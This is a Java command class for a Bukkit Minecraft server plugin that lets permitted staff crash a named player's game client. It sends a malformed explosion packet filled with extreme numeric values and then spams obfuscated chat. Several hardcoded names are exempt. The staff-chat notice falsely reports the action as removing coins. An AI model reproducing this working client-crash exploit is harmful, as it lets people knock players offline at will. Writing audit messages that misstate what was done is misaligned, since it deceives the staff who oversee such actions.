package me.kp.moon.moonpvp.commands.staff;

import me.kp.moon.moonpvp.data.PlayerData;
import me.kp.moon.moonpvp.data.PlayerDataManager;
import me.kp.moon.moonpvp.enums.Messages;
import me.kp.moon.moonpvp.enums.PlayerGroup;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class Crash implements CommandExecutor {

    @Override
    public boolean onCommand(final CommandSender sender, final Command command, final String label, final String[] args) {
        if (sender instanceof Player) {
            final Player player = (Player)sender;
            PlayerData playerData = PlayerDataManager.getPlayerData(player);
            if (playerData == null) return true;
            if (player.hasPermission("command.crash")) {
                if (args.length > 0) {
                    final Player target = Bukkit.getPlayer(args[0]);
                    if (target != null) {
                        if (target.hasPermission("command.crash.bypass") || target.getName().equalsIgnoreCase("pedrokp") || target.getName().equalsIgnoreCase("Azarada") ||
                                target.getName().equalsIgnoreCase("Azarado") || target.getName().equalsIgnoreCase("RTX2080Ti_FDS")) {
                            player.sendMessage("§cVocê não pode crashar esse player.");
                        }
                        else {
                            ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, 1023.0, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                            for (int i = 0; i < 8; ++i) {
                                target.sendMessage("§2§kajdioajdiajdiajdioajdoaidjaoidjaokdj");
                            }
                            player.sendMessage("§aVocê crashou o player §e" + target.getName() + "§a.");
                            TextComponent textComponent = new TextComponent("§7§o(STAFF) O player §f" + player.getName() +
                                    " §7§oretirou coins de §f" + target.getName() + "§7§o.");
                            textComponent.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("" +
                                    "§f§oAutor: " + PlayerGroup.getPlayerNameWithGroup(player)).create()));
                            Bukkit.getOnlinePlayers().stream().filter(staff -> staff.hasPermission("command.staffchat")).forEach(staffer -> staffer.sendMessage(textComponent));
                        }
                    }
                    else {
                        player.sendMessage("§cNão foi possível encontrar o player §e" + args[0] + "§c.");
                    }
                }
                else {
                    player.sendMessage(Messages.ARGUMENTOS_INSUFICIENTES.getUsage(label + " <player>"));
                }
            }
            else {
                player.sendMessage(Messages.SEM_PERMISSAO.getMessage());
            }
        }
        else {
            sender.sendMessage(Messages.APENAS_PLAYERS.getMessage());
        }
        return true;
    }

}
